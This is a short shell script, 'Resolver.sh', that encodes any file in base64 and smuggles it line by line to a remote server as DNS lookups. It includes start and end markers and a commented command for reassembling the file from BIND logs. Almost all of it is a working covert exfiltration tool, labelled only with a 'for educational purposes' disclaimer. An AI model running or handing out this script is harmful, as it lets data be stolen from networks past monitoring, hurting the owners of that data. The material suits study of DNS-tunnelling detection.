#!/bin/sh
# Resolver.sh
# Christopher Neitzert <chris@neitzert.com>
#
# A simple script to encode a file into a very 
# large number of DNS host look up queries for 
# later collection and reassembly on the upstream
# DNS server 
#
#
# Simply change '2001:db8:1:1:1:1:1:1' to your 
# IPv6 Address For IPv4, removing the '-6' arg 
# on every host command.
#
#
# Make sure we are transfering ascii
export CHARSET=ASCII  				
    
# Name our base64 encoded file
B64=$(printf "$1"'.B64') 				

# Encode our file in base64 with 56 byte lines
/usr/bin/base64 -w56 $1 > $B64

# Mark the begining of the file with arbitrary "BEGIN" change to whatever.
host -6 -a -W10 BEGIN.$1 2001:db8:1:1:1:1:1:1  		

#
# Read each line of base64 encoded file into a host call, sleep 1/1000th of a second between calls
#
for line in $(cat $B64)
do

# Sleep 1/1000th of a second between each call. Change to adjust to suit need
        sleep 0.001					
	host -6 -a -W60 $line.io 2001:db8:1:1:1:1:1:1  	

# -6 to specifcy IPv6 
# -a for any lookup type
# -w60 for 60 second connection timeout - useful to change if parts of file do not get transfered
# .io delimteter can be anything, Base64 does not use "." 
# 2001:db8:1:1:1:1:1:1 is destination IPv6 server, change to your server address

done
# Mark the end of the file.  with arbitrary "DONE" change to whatever.
host -6 -a -W10 DONE.$1 2001:db8:1:1:1:1:1:1 		

#
# How to decode data on the destination server
#
# cat $LOCATION_OF_NAMED_LOGFILE | grep .io | grep cache | cut -f2 -d"("| cut -f1 -d"." | base64 -d > $DESIRED_FILE_OUTPUT
# 
# grep .io;  because that was the tld in the main host line (line 31)
# "cache" can be "cache", "REFUSED', or other - your bind implementation may have different log levels.
# 
# Tested with standard RHEL/CentOS/Ubuntu and Bind9.
# Your results may vary
#
# All standard disclaimers apply, no warranty, claims, or promises declared.
# For educational and entertainment purposes only.
# GNUv3

